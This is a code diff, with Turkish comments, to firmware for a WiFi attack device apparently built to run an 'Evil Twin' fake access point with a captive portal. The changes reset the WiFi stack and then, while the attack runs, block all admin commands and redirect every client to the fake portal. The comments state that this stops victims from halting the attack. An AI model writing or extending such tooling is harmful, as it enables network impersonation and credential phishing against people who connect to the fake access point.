@@ -573,14 +573,16 @@ void handle404(WiFiClient &client) {
 
 // ─── Setup ────────────────────────────────────────────────────────────────────
 void setup() {
-  // delfyRTL (gorebrau) referans: WiFi.enableConcurrent() STA+AP eş zamanlı
-  // çalışmasını etkinleştirir. Bu olmadan STA tarama sırasında AP çakışabilir.
+  // Tam WiFi stack sıfırlama: önceki oturumdan kalabilecek her türlü önbelleği temizler.
+  // wifi_off() → wifi_on() (WiFi.enableConcurrent içinde) → temiz başlangıç durumu.
+  wifi_off();
+  delay(500);
+
+  // STA+AP concurrent modu: tarama (WLAN0 STA) + yönetim AP (WLAN1) eş zamanlı çalışır.
   WiFi.enableConcurrent();
-  delay(100);
+  delay(300);
 
   // Yönetim AP'sini başlat (şifreli — sadece yönetim erişimi için)
-  WiFi.disconnect();
-  delay(300);
   WiFi.apbegin(ssid, pass, "1");
   delay(500);
 
@@ -611,6 +613,21 @@ void loop() {
 
     // Evil Twin Captive Portal — önce kontrol et
     if (evil_twin_portal_handle(client, request, path)) {
+      client.stop();
+      return;
+    }
+
+    // Evil Twin aktifken tüm admin komutlarını engelle.
+    // Saldırı süresince yönetim AP'si (X) kapalıdır; cihazlar
+    // sahte AP'ye bağlanıp bu sunucuya ulaşabilir.
+    // stop_evil_twin dahil hiçbir admin komutu çalışmasın —
+    // aksihalde captive portal'a bağlanan kurban veya kullanıcının
+    // kendi cihazı saldırıyı yanlışlıkla durdurabilir.
+    // Saldırıyı durdurmak için cihazı fiziksel olarak sıfırlayın.
+    if (evil_twin_active) {
+      String redir = String("HTTP/1.0 302 Found\r\nLocation: http://")
+                     + ET_AP_IP_STR + "/portal\r\nContent-Length: 0\r\n\r\n";
+      client.write(redir.c_str());
       client.stop();
       return;
     }
